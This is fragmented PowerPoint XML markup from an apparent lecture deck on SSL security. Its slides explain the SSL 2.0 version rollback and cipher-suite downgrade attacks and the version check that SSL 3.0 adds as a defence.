            <a:chOff x="3973680" y="6248520"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="234" name="object 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4058280" y="63244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object 31"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3973680" y="62485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43811909" name="object 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6146280" y="5954400"/>
            <a:ext cx="8535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Finished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832741" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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4881E89B-4EEE-433D-A2E0-8B83A8E0AA8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570293" name="object 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1878840" y="5954400"/>
            <a:ext cx="8535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Finished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8197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Version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-9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Rollback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-9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Attack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66495006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241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8019343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48636481" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1943280" y="2134800"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1943280" y="2134800"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="245" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="194328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93134024" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3592440" y="3505320"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3592440" y="3505320"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="248" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="35812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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="35053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29681943" name="object 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4777560" y="2577600"/>
            <a:ext cx="2241360" cy="938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38160">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="91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=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>2.0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16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PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32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ServerHelloDone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3683764" name="object 14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252" name="object 15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object 16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01126246" name="object 17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631676" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1764720" y="1834920"/>
            <a:ext cx="2523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C,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>2.0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suites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c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20084170" name="object 19"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1905120" y="4447440"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1905120" y="4447440"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="257" name="object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1905120" y="4523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59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object 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4812840" y="444744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2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254304" y="75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08141867" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1874160" y="4147920"/>
            <a:ext cx="111024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{Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-15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}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-15" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PKs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758853" name="object 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2017080" y="5156280"/>
            <a:ext cx="4612320" cy="1302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280" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12240" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="65"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-32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and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S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="18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end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up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communicating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using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SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-15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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>2.0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(weaker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-4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earlier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-4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version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-35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of</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-35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protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-4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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>that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does</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-4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u="sng" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-35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include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-32">
                <a:solidFill>
                  <a:srgbClr val="FF33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FF4C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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Finished</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="FF4C00"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="FF4C00"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>messages)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3098189" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2571840" y="1523880"/>
            <a:ext cx="1009440" cy="980640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1009440"/>
              <a:gd name="textAreaRight" fmla="*/ 1009800 w 1009440"/>
              <a:gd name="textAreaTop" fmla="*/ 0 h 980640"/>
              <a:gd name="textAreaBottom" fmla="*/ 981000 h 980640"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
            <a:pathLst>
              <a:path w="1009650" h="981075" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="535768" y="197214"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="691329" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="678942" y="262392"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="841701" y="144072"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765650" y="296684"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1009649" y="301816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="793930" y="427040"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="853995" y="512792"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="765650" y="559121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="882368" y="710007"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="684318" y="651778"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="698434" y="788947"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="569330" y="723769"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="542780" y="855806"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="461447" y="788947"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="406664" y="895321"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351834" y="823239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="229835" y="981074"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224600" y="828462"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60064" y="809613"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="155654" y="698107"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="584875"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183933" y="526509"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54782" y="375624"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251103" y="355049"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210437" y="164648"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399653" y="289871"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="454435" y="85707"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="535768" y="197214"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="38099">
            <a:solidFill>
              <a:srgbClr val="FF4C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642568" name="object 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1741320" y="2590920"/>
            <a:ext cx="2979720" cy="761760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2979720"/>
              <a:gd name="textAreaRight" fmla="*/ 2980080 w 297972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2980054" h="762000" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1651131" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358759" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2830511" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2830511" y="126999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2979764" y="168271"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2830511" y="317499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2830511" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2358759" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1651131" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="761999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="317499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="126999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="28574">
            <a:solidFill>
              <a:srgbClr val="FF4C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829502" name="object 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1820160" y="2623680"/>
            <a:ext cx="2519280" cy="852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98000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="130"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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Server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" strike="noStrike" spc="-32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is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fooled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into</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" strike="noStrike" spc="-32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thinking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he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is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communicating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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with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a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>client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who</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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supports</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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only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FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="FF3300"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>2.0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0796366" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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4EF41C6A-2289-42E6-A82A-C668FEDCFB6E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45782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2.0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Weaknesses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(Fixed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3.0)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150091" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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07D7A53-3221-4835-BAFB-156539D02B5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212676" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="7925039" cy="543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 algn="just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Cipher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suite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preferences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are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not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authenticated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 algn="just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Tahoma"/>
              <a:buChar char="•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Cipher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suite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rollback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”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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attack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possible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 algn="just">
              <a:lnSpc>
                <a:spcPts val="3328"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="856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Weak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MAC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construction,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MAC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hash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only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40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bits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export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mode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 algn="just">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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2.0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padding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when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computing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MAC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in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block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cipher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modes,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but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padding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length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field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is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authenticated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 algn="just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Tahoma"/>
              <a:buChar char="•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Attacker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delete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bytes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from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messages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 algn="just">
              <a:lnSpc>
                <a:spcPts val="3328"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="845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support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chains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non-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RSA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algorithms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66498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MS PGothic"/>
              </a:rPr>
              <a:t>“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Chosen-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Protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-72">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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Attacks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7604462" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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D04722B-8D4C-4DEE-8883-51340B56AEBF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192270" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1633320"/>
            <a:ext cx="7986600" cy="5923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556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people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release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new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security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protocols?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Because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old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got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broken!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New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must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FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>backward-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>compatible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4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everybody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upgrades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right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away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5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Attacker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fool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someone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into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old,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broken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exploit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known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vulnerabilities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85120" lvl="1" indent="-285120" algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="510"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="2851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Similar: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fool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victim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into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weak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crypto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algorithms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360" algn="r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423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Defense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hard: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must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authenticate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early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41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Many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protocols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had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version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rollback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-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2800" b="0" strike="noStrike" spc="-66">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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attacks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4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SSL,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SSH,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GSM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(cell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phones)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185272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Version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Check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3.0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38128683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273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17200460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65497776" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1943280" y="2146320"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1943280" y="2146320"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="277" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1943280" y="2222640"/>
              <a:ext cx="3077640" cy="36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77845" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="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object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4851360" y="21463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0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101600" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25400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31247057" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3592440" y="1920960"/>
            <a:ext cx="4865400" cy="4098600"/>
            <a:chOff x="3592440" y="1920960"/>
            <a:chExt cx="4865400" cy="4098600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="280" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="3581280"/>
              <a:ext cx="3180960" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3180960"/>
                <a:gd name="textAreaRight" fmla="*/ 3181320 w 3180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181350" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3180820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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="350532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object 13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object 14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4933450" name="object 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4777560" y="2577600"/>
            <a:ext cx="2202480" cy="938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38160">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="91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=3.0,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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16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16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PK</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-32" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>s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, 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ServerHelloDone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>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360543" name="object 16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289026" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1783800" y="1834920"/>
            <a:ext cx="24843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C,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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=3.0,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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suites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600" b="0" strike="noStrike" spc="-38" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>c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17111713" name="object 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1905120" y="4447440"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1905120" y="4447440"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="288" name="object 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1905120" y="4523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59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object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4812840" y="444744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2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="254304" y="75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96396152" name="object 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1847160" y="4147920"/>
            <a:ext cx="19155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{version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6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1600" b="0" strike="noStrike" spc="-15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}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-15" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>PKs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569096" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2510640" y="4711320"/>
            <a:ext cx="3572640" cy="85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8320" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11520" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="459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C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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-7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share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1520" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="366"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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material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16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600" b="0" strike="noStrike" spc="221" baseline="-25000">
                <a:solidFill>
                  <a:srgbClr val="4180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at</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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3366FF"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>point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833611" name="object 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1600200" y="3276720"/>
            <a:ext cx="1993680" cy="919080"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1993680"/>
              <a:gd name="textAreaRight" fmla="*/ 1994040 w 19936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1993900" h="919479" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1163107" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1661582" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1993899" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1993899" y="311149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1993899" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1993899" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1661582" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1385480" y="918930"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1163107" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="533399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="444499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="311149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="28574">
            <a:solidFill>
              <a:srgbClr val="AB56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966130" name="object 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1679040" y="3309480"/>
            <a:ext cx="1718640" cy="746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3040" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPts val="1899"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="181"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="9933FF"/>
                </a:solidFill>
